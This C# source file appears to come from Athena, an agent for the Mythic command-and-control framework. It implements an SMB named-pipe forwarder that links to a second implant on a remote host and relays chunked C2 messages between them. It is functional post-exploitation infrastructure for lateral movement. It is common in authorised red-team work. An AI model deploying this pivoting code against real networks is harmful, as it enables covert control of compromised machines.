using Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using H.Pipes;
using H.Pipes.Args;
using H.Pipes.Extensions;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;
using System.Text.Json;
using Athena.Models.Comms.SMB;

namespace Athena.Forwarders
{
    public class SMBForwarder : IForwarder
    {
        public bool connected { get; set; }
        public string id { get; set; }
        private PipeClient<SmbMessage> clientPipe { get; set; }
        AutoResetEvent messageSuccess = new AutoResetEvent(false);
        public string profile_type => "smb";

        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();

        public SMBForwarder(string id)
        {
            this.id = id;
        }

        //Link to the Athena SMB Agent
        public async Task<bool> Link(MythicJob job, string uuid)
        {
            Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
            try
            {
                if (this.clientPipe is null || !this.connected)
                {
                    this.clientPipe = new PipeClient<SmbMessage>(par["pipename"], par["hostname"]);
                    this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
                    this.clientPipe.Connected += (o, args) => this.connected = true;
                    this.clientPipe.Disconnected += (o, args) => this.connected = false;
                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Established link with agent.");
                        this.connected = true;
                        return true;
                    }
                }
            }
            catch (Exception e) 
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in link: {e}");
            }

            return false;
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            try
            {
                SmbMessage sm = new SmbMessage()
                {
                    final = false,
                    message_type = "chunked_message"
                };

                IEnumerable<string> parts = dm.message.SplitByLength(4000);
                //dm.final = false;

                Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {dm.message.Length} in {parts.Count()} chunks.");
                foreach (string part in parts)
                {
                    sm.delegate_message = part;

                    if (part == parts.Last())
                    {
                        sm.final = true;
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");
                    
                    await this.clientPipe.WriteAsync(sm);
                    
                    //Wait for an indicator of success from the agent.
                    messageSuccess.WaitOne();
                }
                return true;
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in send: {e}");
                return false;
            }
        }
        //Unlink from the named pipe
        public async Task<bool> Unlink()
        {
            try
            {
                await this.clientPipe.DisconnectAsync();
                this.connected = false;
                await this.clientPipe.DisposeAsync();
                this.partialMessages.Clear();
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.delegate_message.Length} bytes");
            try
            {
                if(args.Message.message_type == "success")
                {
                    messageSuccess.Set();
                    return;
                }

                this.partialMessages.TryAdd(args.Message.message_type, new StringBuilder()); //Either Add the key or it already exists
                
                this.partialMessages[args.Message.message_type].Append(args.Message.delegate_message);

                if (args.Message.final)
                {
                    Console.WriteLine(this.partialMessages[args.Message.message_type]);
                    DelegateMessage dm = new DelegateMessage()
                    {
                        c2_profile = this.profile_type,
                        message = this.partialMessages[args.Message.message_type].ToString(),
                    };

                    //DelegateMessage dm = JsonSerializer.Deserialize<DelegateMessage>(this.partialMessages[args.Message.message_type].ToString(), DelegateMessageJsonContext.Default.DelegateMessage);
                    await DelegateResponseHandler.AddDelegateMessageAsync(dm);
                    this.partialMessages.Remove(args.Message.message_type, out _);
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in SMB Forwarder: {e}");
            }
        }
    }
}
